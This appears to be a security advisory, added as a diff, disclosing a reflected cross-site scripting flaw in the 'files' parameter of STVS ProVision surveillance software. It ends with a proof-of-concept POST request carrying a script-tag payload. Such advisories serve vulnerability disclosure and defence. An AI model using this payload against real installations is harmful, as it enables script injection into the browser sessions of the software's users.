@@ -1,0 +1,51 @@
+
+STVS ProVision 5.9.10 Authenticated Reflected Cross-Site Scripting
+
+
+Vendor: STVS SA
+Product web page: http://www.stvs.ch
+Platform: Ruby
+Affected version:  5.9.10 (build 2885-3a8219a)
+                   5.9.9 (build 2882-7c3b787)
+                   5.9.7 (build 2871-a450938)
+                   5.9.1 (build 2771-1bbed11)
+                   5.9.0 (build 2701-6123026)
+                   5.8.6 (build 2557-84726f7)
+                   5.7
+                   5.6
+                   5.5
+
+Summary: STVS is a Swiss company specializing in development of
+software for digital video recording for surveillance cameras
+as well as the establishment of powerful and user-friendly IP
+video surveillance networks.
+
+Desc: Input passed to the POST parameter 'files' is not properly
+sanitised before being returned to the user. This can be exploited
+to execute arbitrary HTML code in a user's browser session in context
+of an affected site.
+
+Tested on: Ubuntu 14.04.3
+           nginx/1.12.1
+           nginx/1.4.6
+           nginx/1.1.19
+           nginx/0.7.65
+           nginx/0.3.61
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2021-5624
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5624.php
+
+19.01.2021
+
+--
+
+
+POST /archive/download HTTP/1.1
+Host: 192.168.1.17
+
+files=%3Cscript%3Ealert(document.URL)%3C%2Fscript%3E
